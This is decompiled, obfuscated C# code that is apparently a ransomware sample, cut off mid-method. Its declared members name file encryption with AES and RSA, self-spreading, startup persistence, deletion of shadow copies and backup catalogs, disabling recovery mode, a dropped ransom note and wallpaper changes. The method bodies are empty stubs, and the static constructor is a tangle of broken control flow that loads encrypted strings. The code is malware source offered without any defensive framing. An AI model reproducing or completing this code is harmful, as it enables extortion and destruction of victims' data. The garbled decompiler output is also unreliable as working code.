using System;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp;

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr intptr_0);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr intptr_0, IntPtr intptr_1);

		static NativeMethods()
		{
			Class0.smethod_13();
			intpreclp = new IntPtr(-3);
		}
	}

	private static string userName;

	private static string userDir;

	public static string appMutexRun;

	public static bool encryptionAesRsa;

	public static string encryptedFileExtension;

	private static bool checkSpread;

	private static string spreadName;

	private static bool checkCopyRoaming;

	private static string processName;

	public static string appMutexRun2;

	private static bool checkStartupFolder;

	private static bool checkSleep;

	private static int sleepTextbox;

	private static string string_0;

	public static string appMutexStartup;

	private static string droppedMessageTextbox;

	private static bool checkAdminPrivilage;

	private static bool checkdeleteShadowCopies;

	private static bool checkdisableRecoveryMode;

	private static bool checkdeleteBackupCatalog;

	public static string appMutexStartup2;

	public static string appMutex2;

	public static string staticSplit;

	public static string appMutex;

	public static readonly Regex appMutexRegex;

	private static string[] messages;

	private static string[] validExtensions;

	private static Random random;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint uint_0, uint uint_1, string string_1, uint uint_2);

	private static void Main(string[] string_1)
	{
	}

	public static void Run()
	{
	}

	private static void sleepOutOfTempFolder()
	{
	}

	public static byte[] random_bytes(int int_0)
	{
		return null;
	}

	public static string RandomString(int int_0)
	{
		return null;
	}

	public static string RandomStringForExtension(int int_0)
	{
		return null;
	}

	public static string Base64EncodeString(string string_1)
	{
		return null;
	}

	public static string randomEncode(string string_1)
	{
		return null;
	}

	private static void encryptDirectory(string string_1)
	{
	}

	public static string rsaKey()
	{
		return null;
	}

	public static string CreatePassword(int int_0)
	{
		return null;
	}

	public static byte[] AES_Encrypt(byte[] byte_0, byte[] byte_1)
	{
		return null;
	}

	public static void EncryptFile(string string_1)
	{
	}

	public static string smethod_0(string string_1, string string_2)
	{
		return null;
	}

	private static void lookForDirectories()
	{
	}

	private static void copyRoaming(string string_1)
	{
	}

	private static void copyResistForAdmin(string string_1)
	{
	}

	private static void addLinkToStartup()
	{
	}

	private static void addAndOpenNote()
	{
	}

	private static void registryStartup()
	{
	}

	private static void spreadIt(string string_1)
	{
	}

	private static void runCommand(string string_1)
	{
	}

	private static void deleteShadowCopies()
	{
	}

	private static void disableRecoveryMode()
	{
	}

	private static void deleteBackupCatalog()
	{
	}

	public static void SetWallpaper(string string_1)
	{
	}

	static Program()
	{
		//IL_000e: Expected O, but got I4
		//IL_0026: Expected O, but got I4
		//IL_0056: Expected O, but got I4
		//IL_0070: Expected O, but got I4
		//IL_008a: Expected O, but got I4
		//IL_00ae: Expected O, but got I4
		//IL_00cf: Expected O, but got I4
		//IL_00e6: Expected O, but got I4
		//IL_00fd: Expected O, but got I4
		//IL_0114: Expected O, but got I4
		//IL_0139: Expected O, but got I4
		//IL_0150: Expected O, but got I4
		//IL_0167: Expected O, but got I4
		//IL_017e: Expected O, but got I4
		//IL_01b8: Expected O, but got I4
		//IL_01d2: Expected O, but got I4
		//IL_0202: Expected O, but got I4
		//IL_021c: Expected O, but got I4
		//IL_025d: Expected O, but got I4
		//IL_0299: Expected O, but got I4
		//IL_02b3: Expected O, but got I4
		//IL_02ef: Expected O, but got I4
		//IL_0309: Expected O, but got I4
		//IL_0323: Expected O, but got I4
		//IL_033d: Expected O, but got I4
		//IL_036f: Expected O, but got I4
		//IL_0390: Expected O, but got I4
		//IL_03ac: Expected O, but got I4
		//IL_03cb: Expected O, but got I4
		//IL_03fb: Expected O, but got I4
		//IL_0430: Expected O, but got I4
		//IL_046c: Expected O, but got I4
		//IL_0486: Expected O, but got I4
		//IL_04a0: Expected O, but got I4
		//IL_04cb: Expected O, but got I4
		//IL_04f6: Expected O, but got I4
		//IL_0510: Expected O, but got I4
		//IL_053f: Expected O, but got I4
		//IL_0556: Expected O, but got I4
		//IL_056d: Expected O, but got I4
		//IL_05a0: Expected O, but got I4
		//IL_05cf: Expected O, but got I4
		//IL_0604: Expected O, but got I4
		//IL_0623: Expected O, but got I4
		//IL_064e: Expected O, but got I4
		//IL_0672: Expected O, but got I4
		//IL_068e: Expected O, but got I4
		//IL_06a6: Expected O, but got I4
		//IL_06d5: Expected O, but got I4
		//IL_06fa: Expected O, but got I4
		//IL_0711: Expected O, but got I4
		//IL_0736: Expected O, but got I4
		//IL_074d: Expected O, but got I4
		//IL_0777: Expected O, but got I4
		//IL_079c: Expected O, but got I4
		//IL_07bd: Expected O, but got I4
		//IL_07d4: Expected O, but got I4
		//IL_07eb: Expected O, but got I4
		//IL_0802: Expected O, but got I4
		//IL_0819: Expected O, but got I4
		//IL_0830: Expected O, but got I4
		//IL_0847: Expected O, but got I4
		//IL_085e: Expected O, but got I4
		//IL_0875: Expected O, but got I4
		//IL_088c: Expected O, but got I4
		//IL_08b2: Expected O, but got I4
		//IL_08d7: Expected O, but got I4
		//IL_08f3: Expected O, but got I4
		//IL_090a: Expected O, but got I4
		//IL_0921: Expected O, but got I4
		//IL_096b: Expected O, but got I4
		//IL_098f: Expected O, but got I4
		//IL_09a9: Expected O, but got I4
		//IL_09ca: Expected O, but got I4
		//IL_09ea: Expected O, but got I4
		//IL_0a00: Expected O, but got I4
		//IL_0a16: Expected O, but got I4
		//IL_0a2c: Expected O, but got I4
		//IL_0a42: Expected O, but got I4
		//IL_0a66: Expected O, but got I4
		//IL_0a80: Expected O, but got I4
		//IL_0a9a: Expected O, but got I4
		//IL_0ac5: Expected O, but got I4
		//IL_0adf: Expected O, but got I4
		//IL_0b09: Expected O, but got I4
		//IL_0b28: Expected O, but got I4
		//IL_0b42: Expected O, but got I4
		//IL_0b5c: Expected O, but got I4
		//IL_0b87: Expected O, but got I4
		//IL_0ba1: Expected O, but got I4
		//IL_0bcc: Expected O, but got I4
		//IL_0be6: Expected O, but got I4
		//IL_0c1b: Expected O, but got I4
		//IL_0c3f: Expected O, but got I4
		//IL_0c59: Expected O, but got I4
		//IL_0c73: Expected O, but got I4
		//IL_0c8d: Expected O, but got I4
		//IL_0ca7: Expected O, but got I4
		//IL_0cde: Expected O, but got I4
		//IL_0cf8: Expected O, but got I4
		//IL_0d12: Expected O, but got I4
		//IL_0d2c: Expected O, but got I4
		//IL_0d46: Expected O, but got I4
		//IL_0d71: Expected O, but got I4
		//IL_0d8b: Expected O, but got I4
		//IL_0da5: Expected O, but got I4
		//IL_0dd0: Expected O, but got I4
		//IL_0dff: Expected O, but got I4
		//IL_0e1d: Expected O, but got I4
		//IL_0e3e: Expected O, but got I4
		//IL_0e55: Expected O, but got I4
		//IL_0e70: Expected O, but got I4
		//IL_0e82: Expected O, but got I4
		//IL_0eac: Expected O, but got I4
		//IL_0ee9: Expected O, but got I4
		//IL_0efb: Expected O, but got I4
		//IL_0f17: Expected O, but got I4
		//IL_0f2e: Expected O, but got I4
		//IL_0f40: Expected O, but got I4
		//IL_0f57: Expected O, but got I4
		//IL_0f7c: Expected O, but got I4
		//IL_0f98: Expected O, but got I4
		//IL_0faf: Expected O, but got I4
		//IL_0fc6: Expected O, but got I4
		//IL_1007: Expected O, but got I4
		//IL_103b: Expected O, but got I4
		//IL_1052: Expected O, but got I4
		//IL_1069: Expected O, but got I4
		//IL_108e: Expected O, but got I4
		//IL_10e6: Expected O, but got I4
		//IL_1102: Expected O, but got I4
		//IL_1127: Expected O, but got I4
		//IL_1143: Expected O, but got I4
		//IL_115a: Expected O, but got I4
		//IL_118d: Expected O, but got I4
		//IL_11a4: Expected O, but got I4
		//IL_11bb: Expected O, but got I4
		//IL_11d2: Expected O, but got I4
		//IL_11f8: Expected O, but got I4
		//IL_120f: Expected O, but got I4
		//IL_1242: Expected O, but got I4
		//IL_1259: Expected O, but got I4
		//IL_127f: Expected O, but got I4
		//IL_12b9: Expected O, but got I4
		//IL_12d0: Expected O, but got I4
		//IL_12e7: Expected O, but got I4
		//IL_1303: Expected O, but got I4
		//IL_1332: Expected O, but got I4
		//IL_1380: Expected O, but got I4
		//IL_13aa: Expected O, but got I4
		//IL_13c5: Expected O, but got I4
		//IL_13e5: Expected O, but got I4
		//IL_1401: Expected O, but got I4
		//IL_1413: Expected O, but got I4
		//IL_1433: Expected O, but got I4
		//IL_144f: Expected O, but got I4
		//IL_146e: Expected O, but got I4
		//IL_149e: Expected O, but got I4
		//IL_14bd: Expected O, but got I4
		//IL_14e6: Expected O, but got I4
		//IL_152f: Expected O, but got I4
		//IL_155c: Expected O, but got I4
		//IL_1585: Expected O, but got I4
		//IL_15a4: Expected O, but got I4
		//IL_15bf: Expected O, but got I4
		//IL_1a01: Expected I4, but got O
		//IL_1a1d: Expected O, but got I4
		//IL_1a43: Expected O, but got I4
		//IL_1a8c: Expected O, but got I4
		//IL_1ab5: Expected O, but got I4
		//IL_1ad8: Expected O, but got I4
		//IL_1af1: Expected O, but got I4
		//IL_1afd: Expected O, but got I4
		//IL_1b2c: Expected O, but got I4
		//IL_1b55: Expected O, but got I4
		//IL_1b7e: Expected O, but got I4
		//IL_1b97: Expected O, but got I4
		//IL_1bab: Expected O, but got I4
		//IL_1bcd: Expected O, but got I4
		//IL_1be0: Expected O, but got I4
		//IL_1c19: Expected O, but got I4
		//IL_1c36: Expected O, but got I4
		//IL_1c49: Expected O, but got I4
		//IL_1c6b: Expected O, but got I4
		//IL_1c7e: Expected O, but got I4
		//IL_1c9d: Expected O, but got I4
		//IL_1cc1: Expected O, but got I4
		//IL_1d38: Expected O, but got I4
		//IL_1d5f: Expected O, but got I4
		//IL_1d8a: Expected O, but got I4
		//IL_1da5: Expected O, but got I4
		//IL_1dc7: Expected O, but got I4
		//IL_1df2: Expected O, but got I4
		//IL_1e04: Expected O, but got I4
		//IL_1e2e: Expected O, but got I4
		//IL_1e4e: Expected O, but got I4
		//IL_1e68: Expected O, but got I4
		//IL_1e79: Expected O, but got I4
		//IL_1e9d: Expected O, but got I4
		//IL_1ebf: Expected O, but got I4
		//IL_1ed9: Expected O, but got I4
		//IL_1eff: Expected O, but got I4
		Class0.smethod_13();
		string[] array = (string[])52;
		string[] array2 = default(string[]);
		while (!Class0.smethod_9(20))
		{
			userName = Environment.UserName;
			array = (string[])72;
			while (true)
			{
				userDir = Class0.smethod_11(164);
				array = (string[])102;
				while (true)
				{
					appMutexRun = Class0.smethod_11(168);
					array = (string[])22;
					while (true)
					{
						encryptionAesRsa = false;
						while (true)
						{
							encryptedFileExtension = Class0.smethod_11(172);
							array = (string[])114;
							while (true)
							{
								IL_1e6a:
								checkSpread = true;
								array = (string[])73;
								if (!smethod_1())
								{
									goto IL_0940;
								}
								goto IL_1e50;
								IL_1e50:
								spreadName = Class0.smethod_11(176);
								array = (string[])237;
								goto IL_1e30;
								IL_1e30:
								checkCopyRoaming = true;
								processName = Class0.smethod_11(180);
								array = (string[])14;
								goto IL_1e16;
								IL_1e16:
								appMutexRun2 = Class0.smethod_11(184);
								array = (string[])219;
								goto IL_1e0e;
								IL_1e0e:
								checkStartupFolder = true;
								goto IL_1e06;
								IL_1e06:
								checkSleep = true;
								goto IL_1df4;
								IL_1df4:
								sleepTextbox = 10;
								array = (string[])50;
								goto IL_1dda;
								IL_1dda:
								string_0 = Class0.smethod_11(188);
								array = (string[])234;
								goto IL_1dc9;
								IL_1dc9:
								appMutexStartup = Class0.smethod_11(192);
								goto IL_1daf;
								IL_1daf:
								droppedMessageTextbox = Class0.smethod_11(196);
								array = (string[])5;
								goto IL_1da7;
								IL_1da7:
								checkAdminPrivilage = true;
								goto IL_1d96;
								IL_1d96:
								checkdeleteShadowCopies = true;
								array = (string[])62;
								goto IL_1d7b;
								IL_1d7b:
								checkdisableRecoveryMode = true;
								array = (string[])207;
								if (!smethod_1())
								{
									goto IL_1a2c;
								}
								goto IL_1d64;
								IL_1d64:
								checkdeleteBackupCatalog = true;
								appMutexStartup2 = Class0.smethod_11(200);
								goto IL_1d42;
								IL_1d42:
								appMutex2 = appMutexStartup2 + appMutexRun2;
								array = (string[])63;
								goto IL_1cc3;
								IL_1cc3:
								staticSplit = Class0.smethod_11(204);
								goto IL_1c9f;
								IL_1c9f:
								appMutex = staticSplit + appMutexStartup + appMutexRun;
								array = (string[])136;
								goto IL_1c80;
								IL_1c80:
								appMutexRegex = new Regex(Class0.smethod_11(208));
								array = (string[])26;
								goto IL_1c6d;
								IL_1c6d:
								array = new string[36];
								array = (string[])169;
								goto IL_1c55;
								IL_1c55:
								array[0] = Class0.smethod_11(212);
								array = (string[])142;
								goto IL_1c38;
								IL_1c38:
								array[1] = "";
								array = (string[])149;
								if (smethod_2())
								{
									goto IL_0697;
								}
								goto IL_1c25;
								IL_1c25:
								array[2] = "";
								array = (string[])7;
								goto IL_1bfb;
								IL_1bfb:
								array[3] = Class0.smethod_11(216);
								array[4] = "";
								array = (string[])211;
								if (!smethod_1())
								{
									goto IL_0ec4;
								}
								goto IL_1bec;
								IL_1bec:
								array[5] = Class0.smethod_11(220);
								goto IL_1be2;
								IL_1be2:
								array[6] = "";
								goto IL_1bcf;
								IL_1bcf:
								array[7] = "";
								array = (string[])69;
								goto IL_1bb7;
								IL_1bb7:
								array[8] = Class0.smethod_11(224);
								array = (string[])18;
								goto IL_1b99;
								IL_1b99:
								array[9] = "";
								array = (string[])132;
								if (smethod_1())
								{
									goto IL_15c4;
								}
								goto IL_1b80;
								IL_1b80:
								array2[16] = Class0.smethod_11(328);
								array = (string[])82;
								goto IL_1b67;
								IL_1b67:
								array2[17] = Class0.smethod_11(332);
								array = (string[])19;
								goto IL_1b57;
								IL_1b57:
								array2[18] = Class0.smethod_11(336);
								goto IL_1b3e;
								IL_1b3e:
								array2[19] = Class0.smethod_11(340);
								array = (string[])248;
								goto IL_1b2e;
								IL_1b2e:
								array2[20] = Class0.smethod_11(344);
								goto IL_1b07;
								IL_1b07:
								array2[21] = Class0.smethod_11(348);
								array2[22] = Class0.smethod_11(352);
								array = (string[])208;
								goto IL_1ada;
								IL_1ada:
								array2[23] = Class0.smethod_11(356);
								array = (string[])216;
								goto IL_1ac1;
								IL_1ac1:
								array2[24] = Class0.smethod_11(360);
								array = (string[])235;
								goto IL_1a9e;
								IL_1a9e:
								array2[25] = Class0.smethod_11(364);
								array = (string[])162;
								if (!smethod_1())
								{
									goto IL_06fa;
								}
								goto IL_1a8e;
								IL_1a8e:
								array2[26] = Class0.smethod_11(368);
								goto IL_1a75;
								IL_1a75:
								array2[27] = Class0.smethod_11(372);
								array = (string[])205;
								goto IL_1a65;
								IL_1a65:
								array2[28] = Class0.smethod_11(376);
								goto IL_1a55;
								IL_1a55:
								array2[29] = Class0.smethod_11(380);
								goto IL_1a45;
								IL_1a45:
								array2[30] = Class0.smethod_11(384);
								goto IL_1a2c;
								IL_1a2c:
								array2[31] = Class0.smethod_11(388);
								array = (string[])76;
								goto IL_1a06;
								IL_1a06:
								array2[32] = Class0.smethod_11(392);
								array = (string[])222;
								if (smethod_1())
								{
									goto IL_15c4;
								}
								goto IL_1e0e;
								IL_15c4:
								while (true)
								{
									switch ((int)array)
									{
									case 267:
										array2[219] = Class0.smethod_11(1140);
										goto case 176;
									case 176:
										array2[220] = Class0.smethod_11(1144);
										array = (string[])115;
										goto case 115;
									case 115:
										array2[221] = Class0.smethod_11(1148);
										array = (string[])171;
										break;
									case 171:
										break;
									case 187:
										goto IL_0094;
									case 252:
										goto IL_00b8;
									case 160:
										goto IL_00cf;
									case 86:
										goto IL_00e6;
									case 214:
										goto IL_00fd;
									case 242:
										goto IL_0114;
									case 188:
										goto IL_0122;
									case 60:
										goto IL_0139;
									case 195:
										goto IL_0150;
									case 135:
										goto IL_0167;
									case 266:
										array2[177] = Class0.smethod_11(972);
										array2[178] = Class0.smethod_11(976);
										array = (string[])75;
										goto case 75;
									case 75:
										array2[179] = Class0.smethod_11(980);
										array = (string[])154;
										goto IL_0658;
									case 168:
										goto IL_01d7;
									case 34:
										goto IL_0202;
									case 45:
										goto IL_021c;
									case 44:
										goto IL_0232;
									case 46:
										goto IL_0243;
									case 68:
										goto IL_025d;
									case 94:
										goto IL_026e;
									case 231:
										goto IL_0299;
									case 99:
										goto IL_02b3;
									case 0:
										goto IL_02c4;
									case 106:
										goto IL_02d5;
									case 85:
										goto IL_02ef;
									case 20:
										goto IL_0309;
									case 117:
										goto IL_0323;
									case 165:
										goto IL_0344;
									case 126:
										goto IL_0376;
									case 49:
										goto IL_0395;
									case 74:
										goto IL_03b1;
									case 4:
										goto IL_03d0;
									case 148:
										goto IL_0405;
									case 190:
										goto IL_0430;
									case 170:
										goto IL_0441;
									case 137:
										goto IL_0452;
									case 67:
										goto IL_046c;
									case 161:
										goto IL_0486;
									case 249:
										goto IL_04a0;
									case 233:
										goto IL_04cb;
									case 145:
										goto IL_04f6;
									case 12:
										goto IL_051a;
									case 70:
										goto IL_0528;
									case 108:
										goto IL_053f;
									case 6:
										goto IL_0556;
									case 15:
										goto IL_056d;
									case 48:
										goto IL_057b;
									case 146:
										goto IL_0589;
									case 8:
										goto IL_05aa;
									case 228:
										goto IL_05d9;
									case 166:
										goto IL_0609;
									case 1:
										goto IL_0623;
									case 230:
										goto IL_0634;
									case 154:
										goto IL_0658;
									case 265:
										array[34] = Class0.smethod_11(264);
										array = (string[])177;
										goto case 177;
									case 177:
										array[35] = "";
										goto IL_0697;
									case 152:
										goto IL_0697;
									case 213:
										goto IL_06b0;
									case 138:
										goto IL_06be;
									case 210:
										goto IL_06d5;
									case 9:
										goto IL_06e3;
									case 247:
										goto IL_06fa;
									case 259:
										goto IL_0711;
									case 141:
										goto IL_071f;
									case 251:
										goto IL_0736;
									case 192:
										goto IL_074d;
									case 264:
										array2[62] = Class0.smethod_11(512);
										array = (string[])143;
										goto case 143;
									case 143:
										array2[63] = Class0.smethod_11(516);
										goto case 209;
									case 209:
										array2[64] = Class0.smethod_11(520);
										array = (string[])193;
										if (smethod_1())
										{
											continue;
										}
										goto case 25;
									case 25:
										array2[112] = Class0.smethod_11(712);
										array = (string[])127;
										goto case 127;
									case 127:
										array2[113] = Class0.smethod_11(716);
										array = (string[])97;
										goto case 97;
									case 97:
										array2[114] = Class0.smethod_11(720);
										array = (string[])151;
										goto case 151;
									case 151:
										array2[115] = Class0.smethod_11(724);
										array = (string[])113;
										goto case 113;
									case 113:
										array2[116] = Class0.smethod_11(728);
										array = (string[])77;
										goto case 77;
									case 77:
										array2[117] = Class0.smethod_11(732);
										array = (string[])91;
										goto case 91;
									case 91:
										array2[118] = Class0.smethod_11(736);
										array = (string[])175;
										goto case 175;
									case 175:
										array2[119] = Class0.smethod_11(740);
										array = (string[])255;
										goto case 255;
									case 255:
										array2[120] = Class0.smethod_11(744);
										array = (string[])57;
										goto case 57;
									case 57:
										array2[121] = Class0.smethod_11(748);
										array = (string[])125;
										if (!smethod_2())
										{
											continue;
										}
										goto IL_1ada;
									case 262:
										array2[109] = Class0.smethod_11(700);
										array = (string[])90;
										goto case 90;
									case 90:
										array2[110] = Class0.smethod_11(704);
										array2[111] = Class0.smethod_11(708);
										array = (string[])25;
										goto case 25;
									case 261:
										array2[124] = Class0.smethod_11(760);
										array = (string[])257;
										goto case 257;
									case 257:
										array2[125] = Class0.smethod_11(764);
										array = (string[])56;
										goto case 56;
									case 56:
										array2[126] = Class0.smethod_11(768);
										array = (string[])232;
										goto case 232;
									case 232:
										array2[127] = Class0.smethod_11(772);
										goto case 59;
									case 59:
										array2[128] = Class0.smethod_11(776);
										goto IL_0940;
									case 202:
										goto IL_0940;
									case 182:
										goto IL_0975;
									case 101:
										goto IL_098f;
									case 260:
										array[31] = "";
										array = (string[])39;
										if (smethod_2())
										{
											goto case 174;
										}
										goto case 39;
									case 174:
										array2[0] = Class0.smethod_11(268);
										array = (string[])236;
										goto case 236;
									case 236:
										array2[1] = Class0.smethod_11(272);
										array = (string[])246;
										goto case 246;
									case 246:
										array2[2] = Class0.smethod_11(276);
										array = (string[])38;
										goto case 38;
									case 38:
										array2[3] = Class0.smethod_11(280);
										array = (string[])153;
										goto case 153;
									case 153:
										array2[4] = Class0.smethod_11(284);
										array = (string[])71;
										if (!smethod_2())
										{
											continue;
										}
										goto case 105;
									case 105:
										array2[151] = Class0.smethod_11(868);
										array = (string[])121;
										goto case 121;
									case 121:
										array2[152] = Class0.smethod_11(872);
										array = (string[])36;
										goto case 36;
									case 36:
										array2[153] = Class0.smethod_11(876);
										array = (string[])189;
										goto case 189;
									case 189:
										array2[154] = Class0.smethod_11(880);
										array2[155] = Class0.smethod_11(884);
										array = (string[])123;
										goto case 123;
									case 123:
										array2[156] = Class0.smethod_11(888);
										array = (string[])166;
										goto IL_0609;
									case 39:
										array[32] = Class0.smethod_11(256);
										goto case 239;
									case 239:
										array[33] = Class0.smethod_11(260);
										array = (string[])265;
										goto case 265;
									case 258:
										array2[135] = Class0.smethod_11(804);
										array = (string[])206;
										goto case 206;
									case 206:
										array2[136] = Class0.smethod_11(808);
										array = (string[])31;
										goto case 31;
									case 31:
										array2[137] = Class0.smethod_11(812);
										array = (string[])88;
										goto case 88;
									case 88:
										array2[138] = Class0.smethod_11(816);
										array2[139] = Class0.smethod_11(820);
										array = (string[])98;
										goto case 98;
									case 98:
										array2[140] = Class0.smethod_11(824);
										array = (string[])32;
										goto case 32;
									case 32:
										array2[141] = Class0.smethod_11(828);
										array2[142] = Class0.smethod_11(832);
										array = (string[])2;
										goto case 2;
									case 2:
										array2[143] = Class0.smethod_11(836);
										array = (string[])212;
										if (smethod_2())
										{
											goto IL_00cf;
										}
										goto case 212;
									case 212:
										array2[144] = Class0.smethod_11(840);
										goto case 227;
									case 227:
										array2[145] = Class0.smethod_11(844);
										array = (string[])3;
										if (smethod_2())
										{
											goto IL_0430;
										}
										goto case 3;
									case 3:
										array2[146] = Class0.smethod_11(848);
										array = (string[])92;
										goto case 92;
									case 92:
										array2[147] = Class0.smethod_11(852);
										array = (string[])53;
										goto case 53;
									case 53:
										array2[148] = Class0.smethod_11(856);
										array = (string[])55;
										goto case 55;
									case 55:
										array2[149] = Class0.smethod_11(860);
										array = (string[])204;
										goto case 204;
									case 204:
										array2[150] = Class0.smethod_11(864);
										array = (string[])105;
										if (!smethod_2())
										{
											continue;
										}
										goto case 220;
									case 220:
										array2[123] = Class0.smethod_11(756);
										goto case 261;
									case 256:
										array2[166] = Class0.smethod_11(928);
										array = (string[])89;
										goto case 89;
									case 89:
										array2[167] = Class0.smethod_11(932);
										array = (string[])37;
										goto case 37;
									case 37:
										array2[168] = Class0.smethod_11(936);
										array = (string[])43;
										goto case 43;
									case 43:
										array2[169] = Class0.smethod_11(940);
										array = (string[])104;
										goto case 104;
									case 104:
										array2[170] = Class0.smethod_11(944);
										array = (string[])109;
										goto case 109;
									case 109:
										array2[171] = Class0.smethod_11(948);
										goto case 100;
									case 100:
										array2[172] = Class0.smethod_11(952);
										array = (string[])131;
										goto case 131;
									case 131:
										array2[173] = Class0.smethod_11(956);
										array = (string[])223;
										goto case 223;
									case 223:
										array2[174] = Class0.smethod_11(960);
										array = (string[])250;
										goto case 250;
									case 250:
										array2[175] = Class0.smethod_11(964);
										array2[176] = Class0.smethod_11(968);
										array = (string[])266;
										if (!smethod_2())
										{
											continue;
										}
										goto case 90;
									case 254:
										array[24] = "";
										array[25] = Class0.smethod_11(248);
										array = (string[])93;
										if (!smethod_1())
										{
											goto case 17;
										}
										goto case 93;
									case 17:
										array2[68] = Class0.smethod_11(536);
										array = (string[])64;
										if (!smethod_2())
										{
											continue;
										}
										goto IL_06b0;
									case 93:
										array[26] = "";
										array = (string[])51;
										goto case 51;
									case 51:
										array[27] = Class0.smethod_11(252);
										array = (string[])66;
										goto case 66;
									case 66:
										array[28] = "";
										goto case 84;
									case 84:
										array[29] = "";
										array = (string[])129;
										goto case 129;
									case 129:
										array[30] = "";
										array = (string[])260;
										goto case 260;
									case 253:
										array2[80] = Class0.smethod_11(584);
										array2[81] = Class0.smethod_11(588);
										array = (string[])224;
										if (!smethod_1())
										{
											goto IL_0711;
										}
										goto case 224;
									case 224:
										array2[82] = Class0.smethod_11(592);
										goto IL_0ec4;
									case 221:
										goto IL_0ec4;
									case 245:
										array[18] = "";
										array = (string[])33;
										goto case 33;
									case 33:
										array[19] = "";
										array = (string[])241;
										if (!smethod_1())
										{
											goto end_IL_1ea7;
										}
										goto case 241;
									case 241:
										array[20] = "";
										array = (string[])140;
										goto case 140;
									case 140:
										array[21] = Class0.smethod_11(240);
										array = (string[])16;
										goto case 16;
									case 16:
										array[22] = "";
										array = (string[])229;
										goto case 229;
									case 229:
										array[23] = Class0.smethod_11(244);
										array = (string[])254;
										goto case 254;
									case 243:
										array[16] = "";
										array[17] = Class0.smethod_11(236);
										array = (string[])245;
										goto case 245;
									case 240:
										array2[49] = Class0.smethod_11(460);
										array = (string[])11;
										goto case 11;
									case 11:
										array2[50] = Class0.smethod_11(464);
										array = (string[])128;
										goto case 128;
									case 128:
										array2[51] = Class0.smethod_11(468);
										array = (string[])147;
										goto case 147;
									case 147:
										array2[52] = Class0.smethod_11(472);
										array2[53] = Class0.smethod_11(476);
										goto case 13;
									case 13:
										array2[54] = Class0.smethod_11(480);
										goto case 164;
									case 164:
										array2[55] = Class0.smethod_11(484);
										array = (string[])111;
										if (smethod_1())
										{
											continue;
										}
										goto IL_0150;
									case 238:
										array2[10] = Class0.smethod_11(308);
										goto case 183;
									case 183:
										array2[11] = Class0.smethod_11(312);
										array = (string[])42;
										goto case 42;
									case 42:
										array2[12] = Class0.smethod_11(160);
										array = (string[])110;
										goto case 110;
									case 110:
										array2[13] = Class0.smethod_11(316);
										array = (string[])158;
										goto case 158;
									case 158:
										array2[14] = Class0.smethod_11(320);
										goto case 226;
									case 226:
										array2[15] = Class0.smethod_11(324);
										array = (string[])196;
										if (smethod_2())
										{
											goto IL_03d0;
										}
										goto IL_1b80;
									case 222:
										array2[33] = Class0.smethod_11(396);
										goto case 180;
									case 180:
										array2[34] = Class0.smethod_11(400);
										goto case 197;
									case 197:
										array2[35] = Class0.smethod_11(404);
										goto IL_06b0;
									case 218:
										array2[165] = Class0.smethod_11(924);
										array = (string[])256;
										goto case 256;
									case 217:
										array2[107] = Class0.smethod_11(692);
										array = (string[])133;
										goto case 133;
									case 133:
										array2[108] = Class0.smethod_11(696);
										goto case 262;
									case 215:
										array[15] = "";
										array = (string[])243;
										goto case 243;
									case 203:
										array2[72] = Class0.smethod_11(552);
										array = (string[])124;
										goto case 124;
									case 124:
										array2[73] = Class0.smethod_11(556);
										array = (string[])28;
										goto case 28;
									case 28:
										array2[74] = Class0.smethod_11(560);
										goto case 178;
									case 178:
										array2[75] = Class0.smethod_11(564);
										array2[76] = Class0.smethod_11(568);
										array = (string[])181;
										goto case 181;
									case 181:
										array2[77] = Class0.smethod_11(572);
										array = (string[])198;
										goto case 198;
									case 198:
										array2[78] = Class0.smethod_11(576);
										array = (string[])116;
										goto case 116;
									case 116:
										array2[79] = Class0.smethod_11(580);
										array = (string[])253;
										if (!smethod_1())
										{
											goto IL_03b1;
										}
										goto case 253;
									case 200:
										array2[92] = Class0.smethod_11(632);
										array = (string[])155;
										goto case 155;
									case 155:
										array2[93] = Class0.smethod_11(636);
										array = (string[])103;
										goto case 103;
									case 103:
										array2[94] = Class0.smethod_11(640);
										array2[95] = Class0.smethod_11(644);
										goto case 119;
									case 119:
										array2[96] = Class0.smethod_11(648);
										array = (string[])35;
										goto case 35;
									case 35:
										array2[97] = Class0.smethod_11(652);
										array = (string[])252;
										if (smethod_1())
										{
											goto IL_00b8;
										}
										goto case 51;
									case 199:
										array2[60] = Class0.smethod_11(504);
										array = (string[])54;
										goto case 54;
									case 54:
										array2[61] = Class0.smethod_11(508);
										goto case 264;
									case 193:
										array2[65] = Class0.smethod_11(524);
										smethod_1();
										if (!smethod_2())
										{
											array = (string[])23;
											goto case 23;
										}
										array = (string[])244;
										if (!smethod_1())
										{
											goto IL_1b07;
										}
										goto IL_1d18;
									case 23:
									case 120:
										array2[66] = Class0.smethod_11(528);
										array = (string[])150;
										goto case 150;
									case 150:
										array2[67] = Class0.smethod_11(532);
										array = (string[])17;
										goto case 17;
									case 186:
										array2[9] = Class0.smethod_11(304);
										array = (string[])238;
										if (smethod_1())
										{
											goto case 238;
										}
										goto case 111;
									case 111:
										array2[56] = Class0.smethod_11(488);
										goto case 172;
									case 172:
										array2[57] = Class0.smethod_11(492);
										array = (string[])179;
										goto case 179;
									case 179:
										array2[58] = Class0.smethod_11(496);
										array2[59] = Class0.smethod_11(500);
										goto case 199;
									case 185:
										array2[134] = Class0.smethod_11(800);
										goto case 258;
									case 173:
										array2[48] = Class0.smethod_11(456);
										array = (string[])240;
										goto case 240;
									case 159:
										array2[91] = Class0.smethod_11(628);
										goto case 200;
									case 157:
										array[14] = "";
										array = (string[])215;
										goto case 215;
									case 139:
										array2[7] = Class0.smethod_11(296);
										array = (string[])130;
										if (!smethod_2())
										{
											goto case 130;
										}
										goto IL_1a45;
									case 130:
										array2[8] = Class0.smethod_11(300);
										array = (string[])186;
										goto case 186;
									case 132:
										array[10] = Class0.smethod_11(228);
										array = (string[])81;
										goto case 81;
									case 81:
										array[11] = "";
										array = (string[])65;
										goto case 65;
									case 65:
										array[12] = "";
										array[13] = Class0.smethod_11(232);
										array = (string[])157;
										goto case 157;
									case 125:
										array2[122] = Class0.smethod_11(752);
										array = (string[])220;
										goto case 220;
									case 96:
										array2[163] = Class0.smethod_11(916);
										array = (string[])83;
										goto case 83;
									case 83:
										array2[164] = Class0.smethod_11(920);
										goto case 218;
